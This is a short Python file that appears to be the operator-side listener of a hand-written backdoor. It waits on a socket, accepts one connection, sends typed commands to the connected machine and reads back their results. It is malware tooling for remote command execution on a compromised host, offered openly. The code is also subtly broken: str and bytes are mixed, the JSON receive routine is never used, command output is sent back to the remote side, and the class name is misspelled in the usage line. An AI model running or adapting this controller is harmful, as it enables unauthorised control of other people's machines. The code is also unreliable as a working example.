import socket
import json
class SocketClient:
    def __init__(self, ip, port):
        backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        backdoor_listener.bind((ip, port))
        backdoor_listener.listen(1)
        print("Listening...")
        (self.connection, address) = backdoor_listener.accept()
        print("Connection OK" + str(address))
    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.sendall((json_data).encode())
    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def command_execution(self, command):
        self.json_send(command)
        return self.connection.recv(1024)

    def start_listener(self):
        while True:
            command = input("Enter command ")
            command_output = self.command_execution(command)
            self.json_send(command_output)
        self.connection.close()


#my_socket_listener = SockerClient("10.2.2.4",7070)
#my_socket_listener.start_listener()